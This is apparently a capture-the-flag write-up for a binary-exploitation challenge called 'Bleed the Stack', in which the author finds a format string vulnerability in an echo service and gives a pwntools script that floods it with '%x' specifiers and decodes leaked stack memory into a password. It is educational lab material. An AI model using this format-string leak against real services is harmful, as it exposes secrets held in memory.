---
title: "Bleed the Stack"
description: "An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?"
author: "0x0539"
date: "2023-05-16"
published: true
tags: ["capture the flag", "0x0539", "binex"]
---

# Bleed the Stack

<aside>
An amateur programmer decides that for his hello world program, he will echo whatever you say. Can you find his mistake?
</aside>

This challenge is based around a command-line program served over `netcat`. Passing the challenge url and port to `nc`, the challenge responds with the following
and prompts us for input:

```bash
pls@RUBY ~ > nc challenges.0x0539.net 7070
ADVANCED CHALLENGE :: BLEED THE STACK
*****************************

Test me! Enter your name and I'll print it back to you!
```

Given the challenge's name, our flag is probably hidden in this program's call stack, so I start off by sending `%x`, or a hexadecimal format string specifier.
This returned hex values, which means the program is likely vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack):

```bash
# ...

Test me! Enter your name and I'll print it back to you!
%x %x %x %x %x %x %x %x
40 f7f77620 1 0 1 20656854 73736170 64726f77
```

To confirm this, we can convert the hexadecimal values to ASCII, yielding the (malformed) string `@÷÷v [f7f77620] ehTssapdrow` (noting that `[f7f77620]` is invalid as ASCII;
the information here is intended to be read by a CPU and so is not necessarily human-readable text).

The string `ehTssapdrow` stands out as some form of actual text - it's 'little-endian' ordering of the ascii string `The password`.

We can automate an exploit with the `pwntools` python module:
- open a connection to the `netcat` server,
- send loads of '%x' format specifiers when prompted for input,
- and finally parse and decode the response.

Noting that some bytearrays dont appear to have a valid ascii representation (such as the aformentioned `f7f77620`), we can handle any errors by just ignoring these as unnecessary.

```python
from pwn import *

context.log_level = "CRITICAL"
host, port = "challenges.0x0539.net", 7070
format_str = "%x " * 299


def decode_bytes(dword: bytes) -> str:
    # change endianness to BE & decode
    try:
        decoded = bytes.fromhex(dword).decode("ascii")[::-1]
        return "".join([ch for ch in decoded if 32 <= ord(ch) <= 126])
    # return unchanged array if it can't be decoded
    except UnicodeDecodeError:
        print(f"UnicodeDecodeError on bytearray '{dword}'.\n")
        return f" {dword} "


def main():
    s = remote(host, port)
    s.recvuntil(b"you!\n")
    s.sendline(format_str)
    raw_bytes = s.recvall().decode().strip()

    # print the values leaked from the call stack to stdout
    print(f"\nbytearray:\n{raw_bytes}\n")
    dwords = raw_bytes.split(" ")

    # ensure each array is 4 bytes long
    dwords = [dword.zfill(8) for dword in dwords]
    decoded_dwords = "".join([decode_bytes(dword) for dword in dwords])

    # print the decoded values
    print(f"leaked:\n{decoded_dwords}")


main()
```

The initial leaked output from this program's call stack gives us the following raw hex:

```lua
40 f7f20620 1 0 1 20656854 73736170 64726f77 3a736920 6c5f4920 5f337630 6d723066 625f7434 733675 25207825 78252078 20782520 25207825 78252078 20782520 25207825
```

Which our script will parse, decoding ASCII strings from their hexadecimal values:

```lua
@ f7f20620 The password is: [flag redacted] %x %x %x %x %x %x %x %x %x %
```


